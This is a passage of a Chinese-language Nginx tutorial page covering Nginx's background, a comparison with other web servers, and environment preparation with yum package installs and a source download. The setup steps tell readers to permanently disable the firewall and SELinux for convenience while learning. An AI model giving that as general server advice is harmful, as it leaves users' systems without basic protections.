href="#least_conn">least_conn</a></li><li><a href="#url_hash">url_hash</a></li><li><a href="#fair">fair</a></li></ul></li><li><a href="#%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E6%A1%88%E4%BE%8B">负载均衡案例</a><ul><li><a href="#%E6%A1%88%E4%BE%8B%E4%B8%80%E5%AF%B9%E6%89%80%E6%9C%89%E8%AF%B7%E6%B1%82%E5%AE%9E%E7%8E%B0%E4%B8%80%E8%88%AC%E8%BD%AE%E8%AF%A2%E8%A7%84%E5%88%99%E7%9A%84%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1">案例一：对所有请求实现一般轮询规则的负载均衡</a></li><li><a href="#%E6%A1%88%E4%BE%8B%E4%BA%8C%E5%AF%B9%E6%89%80%E6%9C%89%E8%AF%B7%E6%B1%82%E5%AE%9E%E7%8E%B0%E5%8A%A0%E6%9D%83%E8%BD%AE%E8%AF%A2%E8%A7%84%E5%88%99%E7%9A%84%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1">案例二：对所有请求实现加权轮询规则的负载均衡</a></li><li><a href="#%E6%A1%88%E4%BE%8B%E4%B8%89%E5%AF%B9%E7%89%B9%E5%AE%9A%E8%B5%84%E6%BA%90%E5%AE%9E%E7%8E%B0%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1">案例三：对特定资源实现负载均衡</a></li><li><a href="#%E6%A1%88%E4%BE%8B%E5%9B%9B%E5%AF%B9%E4%B8%8D%E5%90%8C%E5%9F%9F%E5%90%8D%E5%AE%9E%E7%8E%B0%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1">案例四：对不同域名实现负载均衡</a></li><li><a href="#%E6%A1%88%E4%BE%8B%E4%BA%94%E5%AE%9E%E7%8E%B0%E5%B8%A6%E6%9C%89url%E9%87%8D%E5%86%99%E7%9A%84%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1">案例五：实现带有URL重写的负载均衡</a></li></ul></li></ul></li><li><a href="#nginx%E5%9B%9B%E5%B1%82%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1">Nginx四层负载均衡</a><ul><li><a href="#%E6%B7%BB%E5%8A%A0stream%E6%A8%A1%E5%9D%97%E7%9A%84%E6%94%AF%E6%8C%81">添加stream模块的支持</a></li><li><a href="#nginx%E5%9B%9B%E5%B1%82%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%9A%84%E6%8C%87%E4%BB%A4">Nginx四层负载均衡的指令</a><ul><li><a href="#stream%E6%8C%87%E4%BB%A4">stream指令</a></li><li><a href="#upstream%E6%8C%87%E4%BB%A4-2">upstream指令</a></li></ul></li><li><a href="#%E5%9B%9B%E5%B1%82%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%9A%84%E6%A1%88%E4%BE%8B">四层负载均衡的案例</a><ul><li><a href="#%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90">需求分析</a></li></ul></li></ul></li></ul></li><li><a href="#%E7%BC%93%E5%AD%98%E7%9A%84%E6%A6%82%E5%BF%B5">缓存的概念</a></li><li><a href="#nginx%E7%9A%84web%E7%BC%93%E5%AD%98%E6%9C%8D%E5%8A%A1">Nginx的web缓存服务</a></li><li><a href="#nginx%E7%BC%93%E5%AD%98%E8%AE%BE%E7%BD%AE%E7%9A%84%E7%9B%B8%E5%85%B3%E6%8C%87%E4%BB%A4">Nginx缓存设置的相关指令</a><ul><li><a href="#proxy_cache_path">proxy_cache_path</a></li><li><a href="#proxy_cache">proxy_cache</a></li><li><a href="#proxy_cache_key">proxy_cache_key</a></li><li><a href="#proxy_cache_valid">proxy_cache_valid</a></li><li><a href="#proxy_cache_min_uses">proxy_cache_min_uses</a></li><li><a href="#proxy_cache_methods">proxy_cache_methods</a></li></ul></li><li><a href="#nginx%E7%BC%93%E5%AD%98%E8%AE%BE%E7%BD%AE%E6%A1%88%E4%BE%8B">Nginx缓存设置案例</a><br />*<ul><li><a href="#%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90-2">需求分析</a></li><li><a href="#%E6%AD%A5%E9%AA%A4%E5%AE%9E%E7%8E%B0">步骤实现</a></li></ul></li><li><a href="#nginx%E7%BC%93%E5%AD%98%E7%9A%84%E6%B8%85%E9%99%A4">Nginx缓存的清除</a><ul><li><a href="#%E6%96%B9%E5%BC%8F%E4%B8%80%E5%88%A0%E9%99%A4%E5%AF%B9%E5%BA%94%E7%9A%84%E7%BC%93%E5%AD%98%E7%9B%AE%E5%BD%95">方式一:删除对应的缓存目录</a></li><li><a href="#%E6%96%B9%E5%BC%8F%E4%BA%8C%E4%BD%BF%E7%94%A8%E7%AC%AC%E4%B8%89%E6%96%B9%E6%89%A9%E5%B1%95%E6%A8%A1%E5%9D%97">方式二:使用第三方扩展模块</a><ul><li><a href="#ngx_cache_purge">ngx_cache_purge</a></li></ul></li></ul></li><li><a href="#nginx%E8%AE%BE%E7%BD%AE%E8%B5%84%E6%BA%90%E4%B8%8D%E7%BC%93%E5%AD%98">Nginx设置资源不缓存</a><ul><li><a href="#proxy_no_cache">proxy_no_cache</a></li><li><a href="#proxy_cache_bypass">proxy_cache_bypass</a></li><li><a href="#cookie_nocache-arg_nocache-arg_comment">$cookie_nocache、$arg_nocache、$arg_comment</a></li><li><a href="#%E6%A1%88%E4%BE%8B%E5%AE%9E%E7%8E%B0">案例实现</a></li></ul></li><li><a href="#nginx%E4%B8%8Etomcat%E9%83%A8%E7%BD%B2">Nginx与Tomcat部署</a><ul><li><a href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87tomcat">环境准备(Tomcat)</a></li><li><a href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87nginx">环境准备(Nginx)</a></li></ul></li><li><a href="#nginx%E5%AE%9E%E7%8E%B0%E5%8A%A8%E9%9D%99%E5%88%86%E7%A6%BB">Nginx实现动静分离</a><ul><li><a href="#%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90-3">需求分析</a></li><li><a href="#%E5%8A%A8%E9%9D%99%E5%88%86%E7%A6%BB%E5%AE%9E%E7%8E%B0%E6%AD%A5%E9%AA%A4">动静分离实现步骤</a></li></ul></li><li><a href="#nginx%E5%AE%9E%E7%8E%B0tomcat%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA">Nginx实现Tomcat集群搭建</a></li><li><a href="#nginx%E9%AB%98%E5%8F%AF%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88">Nginx高可用解决方案</a><ul><li><a href="#keepalived">Keepalived</a></li><li><a href="#vrrp%E4%BB%8B%E7%BB%8D">VRRP介绍</a></li><li><a href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">环境搭建</a></li><li><a href="#keepalived%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%8B%E7%BB%8D">Keepalived配置文件介绍</a></li><li><a href="#%E8%AE%BF%E9%97%AE%E6%B5%8B%E8%AF%95">访问测试</a></li><li><a href="#keepalived%E4%B9%8Bvrrp_script">keepalived之vrrp_script</a></li></ul></li><li><a href="#lua">Lua</a><ul><li><a href="#%E6%A6%82%E5%BF%B5">概念</a></li><li><a href="#%E7%89%B9%E6%80%A7">特性</a></li><li><a href="#%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF">应用场景</a></li><li><a href="#lua%E7%9A%84%E5%AE%89%E8%A3%85">Lua的安装</a></li><li><a href="#lua%E7%9A%84%E8%AF%AD%E6%B3%95">Lua的语法</a><ul><li><a href="#%E7%AC%AC%E4%B8%80%E4%B8%AAlua%E7%A8%8B%E5%BA%8F">第一个Lua程序</a></li><li><a href="#lua%E7%9A%84%E6%B3%A8%E9%87%8A">Lua的注释</a></li><li><a href="#%E6%A0%87%E8%AF%86%E7%AC%A6">标识符</a></li><li><a href="#%E5%85%B3%E9%94%AE%E5%AD%97">关键字</a></li><li><a href="#%E8%BF%90%E7%AE%97%E7%AC%A6">运算符</a></li><li><a href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F">全局变量&amp;局部变量</a></li><li><a href="#lua%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">Lua数据类型</a><ul><li><a href="#nil">nil</a></li><li><a href="#boolean">boolean</a></li><li><a href="#number">number</a></li><li><a href="#string">string</a></li><li><a href="#table">table</a></li><li><a href="#function">function</a></li><li><a href="#thread">thread</a></li><li><a href="#userdata">userdata</a></li></ul></li><li><a href="#lua%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%84">Lua控制结构</a><ul><li><a href="#if-then-elseif-else">if then elseif else</a></li><li><a href="#while%E5%BE%AA%E7%8E%AF">while循环</a></li><li><a href="#repeat%E5%BE%AA%E7%8E%AF">repeat循环</a></li><li><a href="#for%E5%BE%AA%E7%8E%AF">for循环</a></li></ul></li></ul></li></ul></li><li><a href="#ngx_lua%E6%A8%A1%E5%9D%97%E6%A6%82%E5%BF%B5">ngx_lua模块概念</a></li><li><a href="#ngx_lua%E6%A8%A1%E5%9D%97%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87">ngx_lua模块环境准备</a><ul><li><a href="#%E6%96%B9%E5%BC%8F%E4%B8%80lua-nginx-module">方式一:lua-nginx-module</a></li><li><a href="#%E6%96%B9%E5%BC%8F%E4%BA%8Copenrestry">方式二:OpenRestry</a><ul><li><a href="#%E6%A6%82%E8%BF%B0">概述</a></li><li><a href="#%E5%AE%89%E8%A3%85">安装</a></li></ul></li></ul></li><li><a href="#ngx_lua%E7%9A%84%E4%BD%BF%E7%94%A8">ngx_lua的使用</a><ul><li><a href="#init_by_lua">init_by_lua*</a></li><li><a href="#init_worker_by_lua">init_worker_by_lua*</a></li><li><a href="#set_by_lua">set_by_lua*</a></li><li><a href="#rewrite_by_lua">rewrite_by_lua*</a></li><li><a href="#access_by_lua">access_by_lua*</a></li><li><a href="#content_by_lua">content_by_lua*</a></li><li><a href="#header_filter_by_lua">header_filter_by_lua*</a></li><li><a href="#body_filter_by_lua">body_filter_by_lua*</a></li><li><a href="#log_by_lua">log_by_lua*</a></li><li><a href="#balancer_by_lua">balancer_by_lua*</a></li><li><a href="#ssl_certificate_by_">ssl_certificate_by_*</a></li><li><a href="#%E9%9C%80%E6%B1%82">需求:</a></li></ul></li><li><a href="#ngx_lua%E6%93%8D%E4%BD%9Credis">ngx_lua操作Redis</a><ul><li><a href="#lua-resty-redis%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87">lua-resty-redis环境准备</a></li></ul></li><li><a href="#ngx_lua%E6%93%8D%E4%BD%9Cmysql">ngx_lua操作Mysql</a><ul><li><a href="#lua-resty-mysql">lua-resty-mysql</a><ul><li><a href="#%E4%BD%BF%E7%94%A8lua-resty-mysql%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%9F%A5%E8%AF%A2">使用lua-resty-mysql实现数据库的查询</a></li><li><a href="#%E4%BD%BF%E7%94%A8lua-cjson%E5%A4%84%E7%90%86%E6%9F%A5%E8%AF%A2%E7%BB%93%E6%9E%9C">使用lua-cjson处理查询结果</a></li><li><a href="#lua-resty-mysql%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9">lua-resty-mysql实现数据库的增删改</a></li></ul></li><li><a href="#%E7%BB%BC%E5%90%88%E5%B0%8F%E6%A1%88%E4%BE%8B">综合小案例</a></li></ul></li></ul></p><h1 id="nginx基础篇"><a class="markdownIt-Anchor" href="#nginx基础篇"></a> Nginx基础篇</h1><h2 id="nginx简介"><a class="markdownIt-Anchor" href="#nginx简介"></a> Nginx简介</h2><h3 id="背景介绍"><a class="markdownIt-Anchor" href="#背景介绍"></a> 背景介绍</h3><p>Nginx（“engine x”）一个具有高性能的【HTTP】和【反向代理】的【WEB服务器】，同时也是一个【POP3/SMTP/IMAP代理服务器】，是由伊戈尔·赛索耶夫(俄罗斯人)使用C语言编写的，Nginx的第一个版本是2004年10月4号发布的0.1.0版本。另外值得一提的是伊戈尔·赛索耶夫将Nginx的源码进行了开源，这也为Nginx的发展提供了良好的保障。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1573470187616.png" alt="1573470187616" /></p><h4 id="名词解释"><a class="markdownIt-Anchor" href="#名词解释"></a> 名词解释</h4><ol><li>WEB服务器：</li></ol><p>WEB服务器也叫网页服务器，英文名叫Web Server，主要功能是为用户提供网上信息浏览服务。</p><ol start="2"><li>HTTP:</li></ol><p>HTTP是超文本传输协议的缩写，是用于从WEB服务器传输超文本到本地浏览器的传输协议，也是互联网上应用最为广泛的一种网络协议。HTTP是一个客户端和服务器端请求和应答的标准，客户端是终端用户，服务端是网站，通过使用Web浏览器、网络爬虫或者其他工具，客户端发起一个到服务器上指定端口的HTTP请求。</p><ol start="3"><li>POP3/SMTP/IMAP：</li></ol><p>POP3(Post Offic Protocol 3)邮局协议的第三个版本，</p><p>SMTP(Simple Mail Transfer Protocol)简单邮件传输协议，</p><p>IMAP(Internet Mail Access Protocol)交互式邮件存取协议，</p><p>通过上述名词的解释，我们可以了解到Nginx也可以作为电子邮件代理服务器。</p><ol start="4"><li>反向代理</li></ol><p>正向代理</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1573489359728.png" alt="1573489359728" /></p><p>反向代理</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1573489653799.png" alt="1573489653799" /></p><h3 id="常见服务器对比"><a class="markdownIt-Anchor" href="#常见服务器对比"></a> 常见服务器对比</h3><p>在介绍这一节内容之前，我们先来认识一家公司叫Netcraft。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Netcraft</span>公司于<span class="hljs-number">1994</span>年底在英国成立，多年来一直致力于互联网市场以及在线安全方面的咨询服务，其中在国际上最具影响力的当属其针对网站服务器、SSL市场所做的客观严谨的分析研究，公司官网每月公布的调研数据（Web Server Survey）已成为当今人们了解全球网站数量以及服务器市场分额情况的主要参考依据，时常被诸如华尔街杂志，英国BBC，Slashdot等媒体报道或引用。<br></code></pre></td></tr></table></figure><p>我们先来看一组数据，我们先打开Nginx的官方网站  <a href="http://nginx.org/">http://nginx.org/</a>,找到Netcraft公司公布的数据，对当前主流服务器产品进行介绍。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581394945120.png" alt="1581394945120" /></p><p>上面这张图展示了2019年全球主流Web服务器的市场情况，其中有Apache、Microsoft-IIS、google Servers、Nginx、Tomcat等，而我们在了解新事物的时候，往往习惯通过类比来帮助自己理解事物的概貌。所以下面我们把几种常见的服务器来给大家简单介绍下：</p><h4 id="iis"><a class="markdownIt-Anchor" href="#iis"></a> IIS</h4><p>​全称(Internet Information Services)即互联网信息服务，是由微软公司提供的基于windows系统的互联网基本服务。windows作为服务器在稳定性与其他一些性能上都不如类UNIX操作系统，因此在需要高性能Web服务器的场合下，IIS可能就会被&quot;冷落&quot;.</p><h4 id="tomcat"><a class="markdownIt-Anchor" href="#tomcat"></a> Tomcat</h4><p>​Tomcat是一个运行Servlet和JSP的Web应用软件，Tomcat技术先进、性能稳定而且开放源代码，因此深受Java爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web应用服务器。但是Tomcat天生是一个重量级的Web服务器，对静态文件和高并发的处理比较弱。</p><h4 id="apache"><a class="markdownIt-Anchor" href="#apache"></a> Apache</h4><p>​Apache的发展时期很长，同时也有过一段辉煌的业绩。从上图可以看出大概在2014年以前都是市场份额第一的服务器。Apache有很多优点，如稳定、开源、跨平台等。但是它出现的时间太久了，在它兴起的年代，互联网的产业规模远远不如今天，所以它被设计成一个重量级的、不支持高并发的Web服务器。在Apache服务器上，如果有数以万计的并发HTTP请求同时访问，就会导致服务器上消耗大量能存，操作系统内核对成百上千的Apache进程做进程间切换也会消耗大量的CUP资源，并导致HTTP请求的平均响应速度降低，这些都决定了Apache不可能成为高性能的Web服务器。这也促使了Lighttpd和Nginx的出现。</p><h4 id="lighttpd"><a class="markdownIt-Anchor" href="#lighttpd"></a> Lighttpd</h4><p>​Lighttpd是德国的一个开源的Web服务器软件，它和Nginx一样，都是轻量级、高性能的Web服务器，欧美的业界开发者比较钟爱Lighttpd,而国内的公司更多的青睐Nginx，同时网上Nginx的资源要更丰富些。</p><h4 id="其他的服务器"><a class="markdownIt-Anchor" href="#其他的服务器"></a> 其他的服务器</h4><p>Google Servers，Weblogic, Webshpere(IBM)…</p><p>经过各个服务器的对比，种种迹象都表明，Nginx将以性能为王。这也是我们为什么选择Nginx的理由。</p><h4 id="nginx的优点"><a class="markdownIt-Anchor" href="#nginx的优点"></a> Nginx的优点</h4><h5 id="1速度更快-并发更高"><a class="markdownIt-Anchor" href="#1速度更快-并发更高"></a> (1)速度更快、并发更高</h5><p>单次请求或者高并发请求的环境下，Nginx都会比其他Web服务器响应的速度更快。一方面在正常情况下，单次请求会得到更快的响应，另一方面，在高峰期(如有数以万计的并发请求)，Nginx比其他Web服务器更快的响应请求。Nginx之所以有这么高的并发处理能力和这么好的性能原因在于Nginx采用了多进程和I/O多路复用(epoll)的底层实现。</p><h5 id="2配置简单扩展性强"><a class="markdownIt-Anchor" href="#2配置简单扩展性强"></a> (2)配置简单，扩展性强</h5><p>Nginx的设计极具扩展性，它本身就是由很多模块组成，这些模块的使用可以通过配置文件的配置来添加。这些模块有官方提供的也有第三方提供的模块，如果需要完全可以开发服务自己业务特性的定制模块。</p><h5 id="3高可靠性"><a class="markdownIt-Anchor" href="#3高可靠性"></a> (3)高可靠性</h5><p>Nginx采用的是多进程模式运行，其中有一个master主进程和N多个worker进程，worker进程的数量我们可以手动设置，每个worker进程之间都是相互独立提供服务，并且master主进程可以在某一个worker进程出错时，快速去&quot;拉起&quot;新的worker进程提供服务。</p><h5 id="4热部署"><a class="markdownIt-Anchor" href="#4热部署"></a> (4)热部署</h5><p>现在互联网项目都要求以7*24小时进行服务的提供，针对于这一要求，Nginx也提供了热部署功能，即可以在Nginx不停止的情况下，对Nginx进行文件升级、更新配置和更换日志文件等功能。</p><h5 id="5成本低-bsd许可证"><a class="markdownIt-Anchor" href="#5成本低-bsd许可证"></a> (5)成本低、BSD许可证</h5><p>BSD是一个开源的许可证，世界上的开源许可证有很多，现在比较流行的有六种分别是GPL、BSD、MIT、Mozilla、Apache、LGPL。这六种的区别是什么，我们可以通过下面一张图来解释下：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1585139995444.png" alt="1585139995444" /></p><p>Nginx本身是开源的，我们不仅可以免费的将Nginx应用在商业领域，而且还可以在项目中直接修改Nginx的源码来定制自己的特殊要求。这些点也都是Nginx为什么能吸引无数开发者继续为Nginx来贡献自己的智慧和青春。OpenRestry [Nginx+Lua]   Tengine[淘宝]</p><h3 id="nginx的功能特性及常用功能"><a class="markdownIt-Anchor" href="#nginx的功能特性及常用功能"></a> Nginx的功能特性及常用功能</h3><p>Nginx提供的基本功能服务从大体上归纳为&quot;基本HTTP服务&quot;、“高级HTTP服务”和&quot;邮件服务&quot;等三大类。</p><h4 id="基本http服务"><a class="markdownIt-Anchor" href="#基本http服务"></a> 基本HTTP服务</h4><p>Nginx可以提供基本HTTP服务，可以作为HTTP代理服务器和反向代理服务器，支持通过缓存加速访问，可以完成简单的负载均衡和容错，支持包过滤功能，支持SSL等。</p><ul><li>处理静态文件、处理索引文件以及支持自动索引；</li><li>提供反向代理服务器，并可以使用缓存加上反向代理，同时完成负载均衡和容错；</li><li>提供对FastCGI、memcached等服务的缓存机制，，同时完成负载均衡和容错；</li><li>使用Nginx的模块化特性提供过滤器功能。Nginx基本过滤器包括gzip压缩、ranges支持、chunked响应、XSLT、SSI以及图像缩放等。其中针对包含多个SSI的页面，经由FastCGI或反向代理，SSI过滤器可以并行处理。</li><li>支持HTTP下的安全套接层安全协议SSL.</li><li>支持基于加权和依赖的优先权的HTTP/2</li></ul><h4 id="高级http服务"><a class="markdownIt-Anchor" href="#高级http服务"></a> 高级HTTP服务</h4><ul><li>支持基于名字和IP的虚拟主机设置</li><li>支持HTTP/1.0中的KEEP-Alive模式和管线(PipeLined)模型连接</li><li>自定义访问日志格式、带缓存的日志写操作以及快速日志轮转。</li><li>提供3xx~5xx错误代码重定向功能</li><li>支持重写（Rewrite)模块扩展</li><li>支持重新加载配置以及在线升级时无需中断正在处理的请求</li><li>支持网络监控</li><li>支持FLV和MP4流媒体传输</li></ul><h4 id="邮件服务"><a class="markdownIt-Anchor" href="#邮件服务"></a> 邮件服务</h4><p>Nginx提供邮件代理服务也是其基本开发需求之一，主要包含以下特性：</p><ul><li>支持IMPA/POP3代理服务功能</li><li>支持内部SMTP代理服务功能</li></ul><h4 id="nginx常用的功能模块"><a class="markdownIt-Anchor" href="#nginx常用的功能模块"></a> Nginx常用的功能模块</h4><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs coq">静态资源部署<br><span class="hljs-keyword">Rewrite</span>地址重写<br>正则表达式<br>反向代理<br>负载均衡<br>轮询、加权轮询、ip_hash、url_hash、fair<br>Web缓存<br>环境部署<br>高可用的环境<br>用户认证模块...<br></code></pre></td></tr></table></figure><p>Nginx的核心组成</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata">nginx二进制可执行文件<br>nginx.<span class="hljs-keyword">conf</span>配置文件<br><span class="hljs-keyword">error</span>.<span class="hljs-keyword">log</span>错误的日志记录<br>access.<span class="hljs-keyword">log</span>访问日志记录<br></code></pre></td></tr></table></figure><h2 id="nginx环境准备"><a class="markdownIt-Anchor" href="#nginx环境准备"></a> Nginx环境准备</h2><h3 id="nginx版本介绍"><a class="markdownIt-Anchor" href="#nginx版本介绍"></a> Nginx版本介绍</h3><p>Nginx的官方网站为: <a href="http://nginx.org">http://nginx.org</a></p><p>打开源码可以看到如下的页面内容</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1580461114467.png" alt="1580461114467" /></p><p>Nginx的官方下载网站为<a href="http://nginx.org/en/download.html">http://nginx.org/en/download.html</a>，当然你也可以之间在首页选中右边的download进入版本下载网页。在下载页面我们会看到如下内容：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1580463222053.png" alt="1580463222053" /></p><h3 id="获取nginx源码"><a class="markdownIt-Anchor" href="#获取nginx源码"></a> 获取Nginx源码</h3><p><a href="http://nginx.org/download/">http://nginx.org/download/</a></p><p>打开上述网站，就可以查看到Nginx的所有版本，选中自己需要的版本进行下载。下载我们可以直接在windows上下载然后上传到服务器，也可以直接从服务器上下载，这个时候就需要准备一台服务器。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1580610584036.png" alt="1580610584036" /></p><h3 id="准备服务器系统"><a class="markdownIt-Anchor" href="#准备服务器系统"></a> 准备服务器系统</h3><p>环境准备</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">VMware WorkStation<br>Centos7<br>MobaXterm<br><span class="hljs-built_in">xsheel,</span>SecureCRT<br>网络<br></code></pre></td></tr></table></figure><p>(1)确认centos的内核</p><p>准备一个内核为2.6及以上版本的操作系统，因为linux2.6及以上内核才支持epoll,而Nginx需要解决高并发压力问题是需要用到epoll，所以我们需要有这样的版本要求。</p><p>我们可以使用<code>uname -a</code>命令来查询linux的内核版本。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581416022481.png" alt="1581416022481" /></p><p>(2)确保centos能联网</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">ping</span> www.baidu.com<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1585224061192.png" alt="1585224061192" /></p><p>(3)确认关闭防火墙</p><p>这一项的要求仅针对于那些对linux系统的防火墙设置规则不太清楚的，建议大家把防火墙都关闭掉，因为我们此次课程主要的内容是对Nginx的学习，把防火墙关闭掉，可以省掉后续Nginx学习过程中遇到的诸多问题。</p><p>关闭的方式有如下两种：</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-params">system</span>ctl stop firewalld      关闭运行的防火墙，系统重新启动后，防火墙将重新打开<br><span class="hljs-params">system</span>ctl disable firewalld   永久关闭防火墙，，系统重新启动后，防火墙依然关闭<br><span class="hljs-params">system</span>ctl status firewalld 查看防火墙状态<br></code></pre></td></tr></table></figure><p>（4）确认停用selinux</p><p>selinux(security-enhanced linux),美国安全局对于强制访问控制的实现，在linux2.6内核以后的版本中，selinux已经成功内核中的一部分。可以说selinux是linux史上最杰出的新安全子系统之一。虽然有了selinux，我们的系统会更安全，但是对于我们的学习Nginx的历程中，会多很多设置，所以这块建议大家将selinux进行关闭。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581418750246.png" alt="" /></p><p>sestatus查看状态</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581419845687.png" alt="1581419845687" /></p><p>如果查看不是disabled状态，我们可以通过修改配置文件来进行设置,修改SELINUX=disabled，然后重启下系统即可生效。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>selinux/config<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581419902873.png" alt="1581419902873" /></p><h3 id="nginx安装方式介绍"><a class="markdownIt-Anchor" href="#nginx安装方式介绍"></a> Nginx安装方式介绍</h3><p>Nginx的安装方式有两种分别是:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">通过Nginx源码<br>通过Nginx源码简单安装 (<span class="hljs-number">1</span>)<br>通过Nginx源码复杂安装 (<span class="hljs-number">3</span>)<br>通过yum安装 (<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>如果通过Nginx源码安装需要提前准备的内容：</p><h5 id="gcc编译器"><a class="markdownIt-Anchor" href="#gcc编译器"></a> GCC编译器</h5><p>Nginx是使用C语言编写的程序，因此想要运行Nginx就需要安装一个编译工具。GCC就是一个开源的编译器集合，用于处理各种各样的语言，其中就包含了C语言。</p><p>使用命令<code>yum install -y gcc</code>来安装</p><p>安装成功后，可以通过<code>gcc --version</code>来查看gcc是否安装成功</p><h5 id="pcre"><a class="markdownIt-Anchor" href="#pcre"></a> PCRE</h5><p>Nginx在编译过程中需要使用到PCRE库（perl Compatible Regular Expressoin 兼容正则表达式库)，因为在Nginx的Rewrite模块和http核心模块都会使用到PCRE正则表达式语法。</p><p>可以使用命令<code>yum install -y pcre pcre-devel</code>来进行安装</p><p>安装成功后，可以通过<code>rpm -qa pcre pcre-devel</code>来查看是否安装成功</p><h5 id="zlib"><a class="markdownIt-Anchor" href="#zlib"></a> zlib</h5><p>zlib库提供了开发人员的压缩算法，在Nginx的各个模块中需要使用gzip压缩，所以我们也需要提前安装其库及源代码zlib和zlib-devel</p><p>可以使用命令<code>yum install -y zlib zlib-devel</code>来进行安装</p><p>安装成功后，可以通过<code>rpm -qa zlib zlib-devel</code>来查看是否安装成功</p><h5 id="openssl"><a class="markdownIt-Anchor" href="#openssl"></a> OpenSSL</h5><p>OpenSSL是一个开放源代码的软件库包，应用程序可以使用这个包进行安全通信，并且避免被窃听。</p><p>SSL:Secure Sockets Layer安全套接协议的缩写，可以在Internet上提供秘密性传输，其目标是保证两个应用间通信的保密性和可靠性。在Nginx中，如果服务器需要提供安全网页时就需要用到OpenSSL库，所以我们需要对OpenSSL的库文件及它的开发安装包进行一个安装。</p><p>可以使用命令<code>yum install -y openssl openssl-devel</code>来进行安装</p><p>安装成功后，可以通过<code>rpm -qa openssl openssl-devel</code>来查看是否安装成功</p><p>上述命令，一个个来的话比较麻烦，我们也可以通过一条命令来进行安装</p><p><code>yum install -y gcc pcre pcre-devel zlib zlib-devel openssl openssl-devel</code>进行全部安装。</p><h4 id="方案一nginx的源码简单安装"><a class="markdownIt-Anchor" href="#方案一nginx的源码简单安装"></a> 方案一：Nginx的源码简单安装</h4><p>(1)进入官网查找需要下载版本的链接地址，然后使用wget命令进行下载</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span>nginx.org<span class="hljs-regexp">/download/</span>nginx-<span class="hljs-number">1.16</span>.<span class="hljs-number">1</span>.tar.gz<br></code></pre></td></tr></table></figure><p>(2)建议大家将下载的资源进行包管理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 